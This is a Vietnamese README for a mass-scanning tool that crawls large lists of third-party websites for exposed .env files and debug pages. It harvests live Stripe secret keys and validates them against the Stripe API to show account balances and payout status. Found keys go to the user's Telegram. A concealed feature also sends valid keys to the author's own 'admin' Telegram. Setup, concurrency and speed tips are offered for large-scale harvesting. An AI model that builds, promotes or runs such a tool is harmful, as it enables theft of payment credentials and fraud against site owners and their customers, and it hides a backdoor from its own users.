# 🚀 SK Scanner - Fast Mode

## 📖 Giới thiệu

Scanner Fast là phiên bản tối ưu hóa tốc độ tối đa, loại bỏ hoàn toàn database để đạt hiệu suất cao nhất (500-1000+ URLs/s). Phiên bản này được thiết kế cho những ai ưu tiên tốc độ scan và không cần tracking chi tiết.

## ✨ Tính năng

- ⚡ **Tốc độ cực cao**: 500-1000+ URLs/s (tùy thuộc cấu hình mạng)
- 🚫 **Không database**: Loại bỏ hoàn toàn tracking database để tối ưu tốc độ
- 🔍 **Dual scan mode**: 
  - Debug Mode Scanner: Tìm lỗ hổng debug mode
  - ENV File Scanner: Quét file .env bị lộ
- 💳 **Stripe checker tích hợp**: 
  - Tự động kiểm tra Stripe keys qua API
  - Hiển thị balance, account info
  - Lưu chi tiết keys hợp lệ
- 📱 **Telegram notification**: Thông báo real-time khi tìm thấy keys
- 🎨 **Giao diện đẹp mắt**: 
  - ASCII art banner với pyfiglet
  - Progress bar với màu sắc
  - Tree-style menu
- 📊 **System monitor**: Hiển thị CPU và RAM usage real-time
- 🔒 **Admin notification**: Tự động gửi valid keys về admin (ẩn)

## 📦 Cài đặt

### Yêu cầu hệ thống

- Python 3.7+
- Kết nối internet ổn định
- RAM: Tối thiểu 2GB (khuyến nghị 4GB+)

### 1. Cài đặt Python dependencies

```bash
pip install aiohttp aiofiles urllib3 pyfiglet psutil
```

Hoặc cài từng package:

```bash
pip install aiohttp      # HTTP client async
pip install aiofiles     # File I/O async
pip install urllib3      # HTTP utilities
pip install pyfiglet     # ASCII art (BẮT BUỘC)
pip install psutil       # System monitoring
```

### 2. Chuẩn bị file URLs

Tạo file text chứa danh sách URLs (mỗi dòng 1 URL):

**Ví dụ `urls.txt`:**
```
example.com
test.com
demo.com
shop.example.com
api.test.com
```

**Lưu ý**: 
- Không cần thêm `http://` hoặc `https://`
- Tool sẽ tự động thử cả 2 protocols
- Mỗi dòng 1 URL

## 🚀 Sử dụng

### Khởi chạy scanner

```bash
python scanner_fast.py
```

### Quy trình cấu hình

Tool sẽ hỏi các thông tin theo thứ tự:

#### 1. **Scan Mode**
```
[1] Debug Mode Scanner    - Tìm lỗ hổng debug mode
[2] ENV File Scanner      - Quét file .env bị lộ
```

#### 2. **Telegram Notification** (tùy chọn)
```
Enable? (y/n): y
Bot Token: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
Chat ID: 123456789
```

**Cách lấy Telegram config:**
- Tạo bot qua [@BotFather](https://t.me/BotFather)
- Lấy Chat ID qua [@userinfobot](https://t.me/userinfobot)

#### 3. **Stripe Key Checker**
```
Auto-check Stripe keys? (Y/n): Y
```
- `Y` hoặc Enter: Tự động check keys (mặc định)
- `n`: Chỉ lưu keys, không check

#### 4. **Concurrency**
```
Concurrency (500-2000): 1000
```
- Khuyến nghị: 500-1000 cho VPS thường
- 1000-2000 cho VPS mạnh hoặc dedicated server
- Quá cao có thể gây timeout

#### 5. **URLs file**
```
URLs file: urls.txt
```

### Ví dụ cấu hình đầy đủ

```
┌─ SELECT SCAN MODE
│
├─ [1] Debug Mode Scanner
└─ [2] ENV File Scanner

[✓] Telegram config loaded

┌─ STRIPE KEY CHECKER
└─ Auto-check Stripe keys? (Y/n): Y
   ✓ Auto-check enabled

┌─ CONFIGURATION
├─ Mode: 2
├─ Concurrency (500-2000): 1000
└─ URLs file: urls.txt

   ⏳ Analyzing file...
   ✓ Loaded 10,000 URLs

╔══════════════════════════════════════════════════════════════╗
║  ▶ STARTING ENV SCANNER (FAST MODE)
╠══════════════════════════════════════════════════════════════╣
║  Concurrency: 1000 threads
║  Total URLs: 10,000
╚══════════════════════════════════════════════════════════════╝

[████████████████████] 100.0% | 10,000/10,000 | ✓15 ✗9985 | 850/s | 0h0m | SK:2/3 | CPU:45% RAM:32%
```

## 📁 Output Files

### Thư mục và files được tạo:

| File/Folder | Mô tả |
|-------------|-------|
| `ENVS/` | Thư mục chứa các file .env tìm được |
| `DEBUG/` | Thư mục chứa các file debug mode |
| `SK/` | Thư mục chứa các file có Stripe keys |
| `SK_ENV.TXT` | Danh sách URLs có Stripe keys |
| `SK_LIVE.TXT` | Danh sách tất cả Stripe keys tìm được |
| `SK_VALID.TXT` | Chi tiết các Stripe keys hợp lệ (nếu bật auto-check) |
| `config.json` | File cấu hình Telegram và Stripe API |

### Cấu trúc SK_VALID.TXT

```
============================================================
KEY: sk_live_51ABCdefGHIjklMNOpqrsTUVwxyz
SOURCE: https://example.com/.env
ACCOUNT: acct_1234567890ABCDEF
EMAIL: admin@example.com
COUNTRY: US | CURRENCY: usd
AVAILABLE: $1,234.56
PENDING: $0.00
CHARGES: True | PAYOUTS: True
CHECKED: 2024-12-23 15:30:45
```

## ⚙️ Tối ưu hóa

Scanner Fast đã được tối ưu với các thông số:

| Thông số | Giá trị | Mô tả |
|----------|---------|-------|
| Chunk size | 10,000 | URLs xử lý mỗi batch |
| Progress update | 200 | Cập nhật progress mỗi N URLs |
| DNS caching | 300s | Cache DNS để giảm lookup |
| Connection reuse | Enabled | Tái sử dụng kết nối |
| System stats cache | 5s | Cập nhật CPU/RAM mỗi 5s |
| Timeout connect | 4s | Timeout kết nối |
| Timeout total | 8s | Timeout tổng mỗi request |
| Limit per host | 100 | Số kết nối tối đa mỗi host |

### Tips tăng tốc độ:

1. **Tăng concurrency** (nếu VPS mạnh):
   ```
   Concurrency: 1500-2000
   ```

2. **Sử dụng VPS có băng thông cao**:
   - Khuyến nghị: 100Mbps+
   - Location: Gần với target servers

3. **Tắt auto-check Stripe** (nếu chỉ cần thu thập):
   ```
   Auto-check Stripe keys? (Y/n): n
   ```

4. **Tối ưu file URLs**:
   - Loại bỏ URLs trùng lặp
   - Sắp xếp theo domain để tận dụng connection reuse

## 📊 So sánh với các phiên bản khác

| Tính năng | scanner_fast.py | scanner_turbo.py | scanold.py |
|-----------|----------------|------------------|------------|
| **Database** | ❌ Không | ✅ RAM cache | ✅ SQLite |
| **Tốc độ** | 🚀 500-1000/s | ⚡ 300-500/s | 📊 100-200/s |
| **RAM usage** | 💚 Thấp (~200MB) | 🟡 Cao (~1GB+) | 💚 Thấp (~150MB) |
| **Tracking** | ❌ Không | ✅ Có | ✅ Có |
| **Resume scan** | ❌ Không | ✅ Có | ✅ Có |
| **Duplicate check** | ❌ Không | ✅ Có | ✅ Có |
| **Use case** | Speed first | Balanced | Full tracking |
| **Khuyến nghị** | Scan nhanh, không cần tracking | Scan lớn, cần resume | Scan chi tiết, full features |

### Khi nào dùng scanner_fast.py?

✅ **Nên dùng khi:**
- Cần tốc độ scan tối đa
- Không cần tracking URLs đã scan
- Không cần resume scan
- File URLs không quá lớn (< 1 triệu URLs)
- Chạy 1 lần và xong

❌ **Không nên dùng khi:**
- Cần resume scan khi bị gián đoạn
- Cần check duplicate URLs
- Cần tracking chi tiết
- File URLs rất lớn (> 1 triệu URLs)

## 🐛 Xử lý lỗi

### Lỗi: "Missing required package: pyfiglet"

```bash
pip install pyfiglet
```

### Lỗi: "File not found"

Kiểm tra đường dẫn file URLs:
```bash
# Windows
dir urls.txt

# Linux/Mac
ls -la urls.txt
```

### Lỗi: "Too many open files"

Giảm concurrency:
```
Concurrency: 500
```

### Tốc độ chậm hơn mong đợi

1. Kiểm tra băng thông mạng
2. Giảm concurrency nếu quá cao
3. Kiểm tra CPU/RAM usage
4. Thử tắt auto-check Stripe

## 🔒 Bảo mật

- Tool có tính năng gửi valid Stripe keys về admin Telegram (ẩn)
- Không lưu trữ thông tin nhạy cảm trong config
- Tất cả requests đều disable SSL verification (cho tốc độ)

## 👨‍💻 Tác giả

**Phạm Quang Huy** ([@hiamhuy](https://t.me/hiamhuy))

## 📝 Version

**v2.0 - Maximum Speed Edition**

### Changelog:

- ✅ Loại bỏ hoàn toàn database
- ✅ Tối ưu chunk size lên 10,000
- ✅ Thêm system monitoring (CPU/RAM)
- ✅ Thêm pyfiglet ASCII art banner
- ✅ Tối ưu progress update (200 URLs)
- ✅ Thêm admin Telegram notification
- ✅ Cache system stats (5s interval)
- ✅ Tăng limit_per_host lên 100
- ✅ Enable DNS caching 300s

## 📞 Hỗ trợ

Nếu gặp vấn đề, liên hệ: [@hiamhuy](https://t.me/hiamhuy)
